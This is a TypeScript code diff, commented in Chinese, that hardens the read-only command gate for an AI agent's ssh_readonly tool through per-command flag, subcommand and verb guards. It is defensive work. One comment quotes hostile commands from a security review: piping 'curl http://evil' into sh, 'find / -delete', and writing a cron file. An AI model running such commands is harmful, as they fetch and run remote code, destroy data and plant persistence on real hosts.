@@ -67,6 +67,17 @@ interface CommandRules {
   powerCommands: string[]
   shellLaunchers: string[]
   readonlyCommands: string[]
+  readonlyExtraCommands: string[]
+  readonlyDenyVerbs: string[]
+  readonlyGuards: {
+    subcommands: Record<string, string[]>
+    denyFlags: Record<string, string[]>
+    requireFlags: Record<string, string[]>
+    noPositional: string[]
+    positionalPrefix: Record<string, string>
+    verbPositionals: string[]
+    denyAssign: string[]
+  }
   prefixSkips: { commands: string[]; valueFlags: string[] }
   argvRules: ArgvRule[]
   denyBaseline: { mustNotBeBelow: Record<string, CommandRiskLevel>; blockDetectors: string[] }
@@ -809,46 +820,158 @@ export function evaluateCommand(command: string, depth = 0): CommandVerdict {
 // AI「只读」工具专用闸门
 // ---------------------------------------------------------------------------
 
-const READONLY_SET = new Set(RULES.readonlyCommands)
-
-/** 只读命令里也不许出现的"执行/写入位置"字符：出现就不是只读查询 */
-const NOT_READONLY_PATTERN = /[;|&<>`$(){}\[\]*?\n\r\\]/
-
 export interface ReadonlyVerdict {
   ok: boolean
   reason?: string
 }
 
+const READONLY_SET = new Set([...RULES.readonlyCommands, ...RULES.readonlyExtraCommands])
+
+/** 位置参数里出现这些词就是变更动作（只用于 verbPositionals 点名的命令，见数据文件注释） */
+const READONLY_DENY_VERBS = new Set(RULES.readonlyDenyVerbs)
+
 /**
- * 严格只读判定：argv0 必须在只读白名单里，且整条命令不含任何 shell 执行位，
- * 并且通用风险闸判成 low。
+ * 只读护栏
+ *
+ * 白名单只能说明"这个命令名可以只读"，`systemctl status` 与 `systemctl stop`、
+ * `fdisk -l` 与 `fdisk /dev/sda` 的差别全在旗标和子命令上，所以护栏按命令给。
+ */
+const RG = RULES.readonlyGuards
+
+/**
+ * 旗标是否命中护栏里的某一条
+ *
+ * `--vacuum-size=1M` 要算命中 `--vacuum`，`top -bn1` 要算命中 `-b`：
+ * 长旗标按"= 前的名字"比并允许 `-后缀` 延伸，短旗标按整串或簇内字母比。
+ * 这两条不成立时，`journalctl --vacuum-size` 会溜过去，`top -bn1` 会被误杀。
+ */
+function flagMatches(token: string, flag: string): boolean {
+  const head = token.split('=')[0]
+  if (head === flag) return true
+  if (flag.startsWith('--')) return head.startsWith(`${flag}-`)
+  // 短旗标：-o 命中 -o，也命中 -of / -bn1 这类簇
+  if (flag.length === 2 && flag[1] !== '-' && head.startsWith('-') && !head.startsWith('--')) {
+    return head.slice(1).includes(flag[1])
+  }
+  return false
+}
+
+/** 一个非旗标参数是否算"变更动词"（整词匹配，不看子串，免得误杀 /etc/hosts 这类路径） */
+function isDenyVerb(word: string): boolean {
+  return READONLY_DENY_VERBS.has(word)
+}
+
+/** 把 token 分成旗标与位置参数两类 */
+function splitArgs(toks: Token[]): { flags: string[]; positionals: string[] } {
+  const flags: string[] = []
+  const positionals: string[] = []
+  for (const t of toks) {
+    if (t.value.length > 1 && t.value.startsWith('-')) flags.push(t.value)
+    else positionals.push(t.value)
+  }
+  return { flags, positionals }
+}
+
+/**
+ * 逐段（管道/复合的每一小节）判是否只读
+ *
+ * 顺序：写目的地 → 命令名 → 白名单 → 护栏（旗标、必带旗标、子命令、位置参数）。
+ * 任何一步不过就带回原因，让模型知道该怎么改写命令，而不是只说"不允许"。
+ */
+function judgeReadonlySegment(seg: Segment): ReadonlyVerdict {
+  for (const w of seg.writes) {
+    // `2>&1` 这类是把描述符接过去，不落到文件上
+    if (/^&?\d*$/.test(w.trim())) continue
+    const n = normTarget(w)
+    if (!isDiscardPath(n)) return { ok: false, reason: `要写到 ${n}，不是只读查询` }
+  }
+  const first = seg.toks[0]?.value
+  if (!first) return { ok: false, reason: '空命令段' }
+  // `2>&1` 里的 `&` 是段分隔符，切完会剩下一段只有文件描述符数字的东西。
+  // 不认它也不放行：要丢弃就写两遍 >/dev/null 2>/dev/null。
+  if (/^\d+$/.test(first)) {
+    return { ok: false, reason: '不支持 2>&1 这种描述符合并，要丢弃就写 >/dev/null 2>/dev/null' }
+  }
+  const argv0 = baseCommand(seg.toks)
+  if (!argv0) {
+    // 只剩包装器本身：`env` 单用是打印环境（只读），`sudo` 这类直接拒
+    if (seg.toks.length === 1 && READONLY_SET.has(first)) return judgeReadonlyArgs(first, [])
+    return { ok: false, reason: '取不到命令名' }
+  }
+  if (argv0 !== first) {
+    return { ok: false, reason: `不允许 ${first} 这类包装器，去掉后再来` }
+  }
+  if (!READONLY_SET.has(argv0)) return { ok: false, reason: `${argv0} 不在只读命令白名单里` }
+  return judgeReadonlyArgs(argv0, seg.toks.slice(1))
+}
+
+/** 命令名确定之后，按护栏逐条判旗标与位置参数 */
+function judgeReadonlyArgs(argv0: string, rest: Token[]): ReadonlyVerdict {
+  const { flags, positionals } = splitArgs(rest)
+
+  const deny = RG.denyFlags[argv0] ?? []
+  for (const f of flags) {
+    const hit = deny.find((d) => flagMatches(f, d))
+    if (hit) return { ok: false, reason: `${argv0} ${hit} 会改动东西，不是只读查询` }
+  }
+  const need = RG.requireFlags[argv0]
+  if (need && !need.some((n) => flags.some((f) => flagMatches(f, n)))) {
+    return { ok: false, reason: `${argv0} 要带 ${need.join(' 或 ')}（否则会一直刷屏或不返回）` }
+  }
+
+  const subs = RG.subcommands[argv0]
+  if (subs) {
+    const sub = positionals[0]
+    if (!sub) return { ok: false, reason: `${argv0} 要带子命令，例如 ${argv0} ${subs[0]}` }
+    if (!subs.includes(sub)) {
+      return { ok: false, reason: `${argv0} ${sub} 不是只读子命令；能用的是 ${subs.slice(0, 5).join('、')}…` }
+    }
+  }
+  if (RG.noPositional.includes(argv0) && positionals.length > 0) {
+    return { ok: false, reason: `${argv0} 不许带参数（带参数就是改状态）` }
+  }
+  const prefix = RG.positionalPrefix[argv0]
+  if (prefix && positionals.some((p) => !p.startsWith(prefix))) {
+    return { ok: false, reason: `${argv0} 的位置参数只能以 ${prefix} 开头` }
+  }
+  if (RG.verbPositionals.includes(argv0) && positionals.some(isDenyVerb)) {
+    return { ok: false, reason: `${argv0} 的参数里有变更动作（set/add/del 这类）` }
+  }
+  if (RG.denyAssign.includes(argv0) && positionals.some((p) => p.includes('='))) {
+    return { ok: false, reason: `${argv0} 的参数里有 变量=值 赋值，会改状态` }
+  }
+  return { ok: true }
+}
+
+/**
+ * 严格只读判定：复合命令逐段判，每段都必须是白名单命令 + 无写入 + 无变更旗标，
+ * 重定向只许写进丢弃位（/dev/null 这类），并且不许有命令替换。
  *
  * 为什么单独要这一条：`ssh_readonly` 工具原先是"黑名单非写动词"，
  * `curl http://evil | sh`、`find / -delete`、`tee /etc/cron.d/pwn` 全都不含那份名单里的动词，
  * 于是被当成"只读"直接在远端执行 —— 工具名与实现完全不是一回事（2026-10-09 安全审查 P0-2）。
+ *
+ * 2026-10-12 反过来又出了一次事故：旧实现用一条字符正则把管道、重定向、通配一律拒掉，
+ * 实测 50 条常规诊断命令里 28 条被误杀（`ps aux | head`、`systemctl status nginx`、
+ * `git status`、`lsblk` 全不让用），用户看到的就是"很多命令不让运行"。
+ * 现在按结构逐段判，并用数据里的护栏把真正的写入面挡住；通用风险闸兜底判 block/high/medium。
  */
 export function isStrictlyReadonly(command: string): ReadonlyVerdict {
   const trimmed = (command ?? '').trim()
   if (!trimmed) return { ok: false, reason: '空命令' }
-  if (NOT_READONLY_PATTERN.test(trimmed)) {
-    return { ok: false, reason: '命令里含 shell 执行/写入位（分号、管道、重定向、命令替换、通配等），不是只读查询' }
-  }
   const { segments, embedded } = scan(trimmed)
-  if (embedded.length > 0 || segments.length > 1) {
-    return { ok: false, reason: '只允许单条简单命令，检测到复合命令或命令替换' }
+  if (embedded.length > 0) {
+    return { ok: false, reason: '命令里有 $() 或反引号，内层判不了，不算只读查询' }
   }
-  const seg = segments[0]
-  if (!seg || seg.writes.length > 0) return { ok: false, reason: '检测到重定向目标' }
-  const argv0 = baseCommand(seg.toks)
-  if (!argv0) return { ok: false, reason: '取不到命令名' }
-  if (argv0 !== seg.toks[0]?.value) {
-    return { ok: false, reason: `不允许 ${seg.toks[0]?.value ?? ''} 这类包装器，去掉后再来` }
+  if (segments.length === 0) return { ok: false, reason: '取不到命令段' }
+  for (const seg of segments) {
+    const r = judgeReadonlySegment(seg)
+    if (!r.ok) return r
   }
-  if (!READONLY_SET.has(argv0)) return { ok: false, reason: `${argv0} 不在只读命令白名单里` }
-  const verdict = evaluateCommand(trimmed)
-  if (verdict.level === 'block') return { ok: false, reason: verdict.reason }
-  if (verdict.level !== 'low') {
-    return { ok: false, reason: `风险闸判成 ${verdict.level}（${verdict.reason}），不是只读查询` }
+  // 兜底：硬闸（rm -rf / 写设备 管道接 shell fork 炸弹…）判重的，一律不当它是只读
+  const overall = evaluateCommand(trimmed)
+  if (overall.level !== 'low' && overall.level !== 'safe') {
+    return { ok: false, reason: `风险闸判成 ${overall.level}（${overall.reason}），不是只读查询` }
   }
   return { ok: true }
 }
